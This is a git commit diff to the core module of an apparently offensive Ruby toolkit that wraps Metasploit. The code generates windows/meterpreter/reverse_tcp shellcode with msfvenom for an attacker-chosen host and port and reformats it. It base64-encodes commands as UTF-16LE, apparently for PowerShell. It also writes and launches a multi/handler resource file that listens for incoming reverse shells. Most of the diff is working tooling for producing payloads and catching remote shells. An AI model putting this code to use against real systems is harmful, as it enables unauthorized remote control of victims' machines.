b9a49abef7413d1720f1a329054881eaeda009ba
b00stfr3ak <goduke44@gmail.com>
2013-09-05 21:53:35 -0700

    Added Random Name Generator
    Added a random name generator also fixed some things

--- lib/core.rb
+++ lib/core.rb
@@ -1,4 +1,6 @@
 #!/usr/bin/env ruby
+require 'base64'
+require 'fileutils'
 module MainCommands
   def print_error(text)
     print "\e[31m[-]\e[0m #{text}"
@@ -12,25 +14,30 @@ module MainCommands
   def get_input(text)
     print "\e[33m[!]\e[0m #{text}"
   end 
-  def encoded_command(command)
-    encoded_command = Base64.encode64(command.encode("utf-16le")).delete("\r\n")
+  def encode_command(command)
+    Base64.encode64(command.encode("utf-16le")).delete("\r\n")
+  end
+  def random_name_gen(name_length = 6)
+    file_name = name_length.to_i.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9'].sample}.join
+    return file_name
   end
 end
 module MsfCommands
   def generate_shellcode(host,port)
     if File.exist?('/usr/bin/msfvenom')
-      msf_path = '/usr/bin/'
+      @msf_path = '/usr/bin/'
     elsif File.exist?("/opt/metasploit-framework/msfvenom")
-      msf_path = ('/opt/metasploit-framework/')
+      @msf_path = ('/opt/metasploit-framework/')
     else
       print_error("Metasploit Not Found!")
       exit
     end
     @set_payload = "windows/meterpreter/reverse_tcp"
     print_info("Generating shellcode\n")
-    execute  = `#{msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
+    execute  = `#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
+    print_success("Shellcode Generated\n")
     shellcode = clean_shellcode(execute)
-    puts shellcode
+    return shellcode
   end
   def clean_shellcode(shellcode)
     shellcode = shellcode.gsub('\\',",0")
@@ -41,10 +48,11 @@ module MsfCommands
     shellcode[0..4] = ''
     return shellcode
   end
-  def metasploit_setup(msf_path,host,port)
-    print_info("Setting up Metasploit this may take a moment\n")
+  def metasploit_setup(host,port)
+    file_path = 'metaspoit_files/'
     rc_file = "msf_listener.rc"
-    file = File.open("#{rc_file}",'w')
+    print_info("Setting up Metasploit this may take a moment\n")
+    file = File.open("#{file_path}#{rc_file}",'w')
     file.write("use exploit/multi/handler\n")
     file.write("set PAYLOAD #{@set_payload}\n")
     file.write("set LHOST #{host}\n")
@@ -53,6 +61,6 @@ module MsfCommands
     file.write("set ExitOnSession false\n")
     file.write("exploit -j")
     file.close
-    system("#{msf_path}./msfconsole -r #{rc_file}")
+    system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
   end
 end
